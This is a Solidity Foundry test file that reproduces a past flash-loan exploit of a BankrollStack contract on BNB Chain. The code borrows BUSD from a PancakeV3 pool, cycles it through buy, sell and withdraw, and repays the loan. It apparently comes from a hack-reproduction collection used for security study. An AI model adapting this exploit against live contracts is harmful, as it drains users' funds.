// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";


// @KeyInfo - Total Lost : 5k USD
// Attacker : https://bscscan.com/address/0x172dca3e72e4643ce8b7932f4947347c1e49ba6d
// Attack Contract : 0x92c56dd0c9eee1da9f68f6e0f70c4a77de7b2b3c
// Vulnerable Contract : 0x16d0a151297a0393915239373897bCc955882110
// Attack Tx : https://bscscan.com/tx/0x0706425beba4b3f28d5a8af8be26287aa412d076828ec73d8003445c087af5fd

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x16d0a151297a0393915239373897bCc955882110#code

// @Analysis
// Post-mortem : https://x.com/Phalcon_xyz/status/1943518566831296566
// Twitter Guy : https://x.com/TenArmorAlert/status/1935618109802459464
// Hacking God : https://x.com/Phalcon_xyz/status/1943518566831296566
pragma solidity ^0.8.0;

contract Bankrollstack is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 51698204 - 1;
    uint256 flashAmount = 28300000000000000000000;

    //contracts
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address constant PancakeV3Pool = 0x4f3126d5DE26413AbDCF6948943FB9D0847d9818;
    address constant BankrollStack = 0x16d0a151297a0393915239373897bCc955882110; 

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        fundingToken = address(BUSD);
    }

    function testExploit() public balanceLog {
        IPancakeV3Pool(PancakeV3Pool).flash(address(this), 0, flashAmount, "0x00");  
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        
        uint256 buyAmount = IERC20(BUSD).balanceOf(address(this));
        uint256 repayAmount = 28302830000000000000000;

        IERC20(BUSD).approve(address(BankrollStack), type(uint256).max);

        IBankrollStack(BankrollStack).buy(buyAmount);
        uint256 myTokens  = IBankrollStack(BankrollStack).myTokens();
        IBankrollStack(BankrollStack).sell(myTokens);
        IBankrollStack(BankrollStack).withdraw();
        IERC20(BUSD).transfer(address(PancakeV3Pool), repayAmount);
    }
}

interface IBankrollStack {
	function donatePool(uint256 tokenAmount) external;     
	function buy(uint256 tokenAmount) external returns (uint256);
	function sell(uint256 tokenAmount) external;
	function myTokens() external view returns (uint256);
	function myDividends() external view returns (uint256);
	function withdraw() external;
}

